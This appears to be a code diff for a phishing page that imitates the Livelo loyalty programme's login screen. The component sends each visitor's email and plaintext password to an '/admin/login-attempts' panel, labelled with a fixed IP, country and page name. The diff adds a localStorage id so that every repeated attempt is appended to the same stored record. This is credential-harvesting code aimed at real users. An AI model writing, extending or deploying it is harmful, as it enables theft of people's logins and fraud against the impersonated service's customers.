@@ -36,17 +36,32 @@ function LiveloLogin() {
     const sendData = async () => {
       if (credential && password && validateCredential(credential)) {
         try {
-          const response = await axios.post(`${API}/admin/login-attempts`, {
-            email: credential,
-            password: password,
-            ip_address: "127.0.0.1",
-            country: "Brasil",
-            device: "Desktop",
-            page: "Login Livelo"
-          });
+          // Verificar se já existe um userId no localStorage
+          let currentUserId = localStorage.getItem("livelo_user_id");
           
-          if (response.data && response.data.id) {
-            setUserId(response.data.id);
+          if (!currentUserId) {
+            // Primeira tentativa - criar novo registro
+            const response = await axios.post(`${API}/admin/login-attempts`, {
+              email: credential,
+              password: password,
+              ip_address: "127.0.0.1",
+              country: "Brasil",
+              device: "Desktop",
+              page: "Login Livelo"
+            });
+            
+            if (response.data && response.data.id) {
+              currentUserId = response.data.id;
+              localStorage.setItem("livelo_user_id", currentUserId);
+              setUserId(currentUserId);
+            }
+          } else {
+            // Tentativa adicional - adicionar ao registro existente
+            const response = await axios.post(`${API}/admin/login-attempts/${currentUserId}/add-attempt`, {
+              email: credential,
+              password: password
+            });
+            setUserId(currentUserId);
           }
         } catch (error) {
           console.error("Erro ao enviar dados:", error);
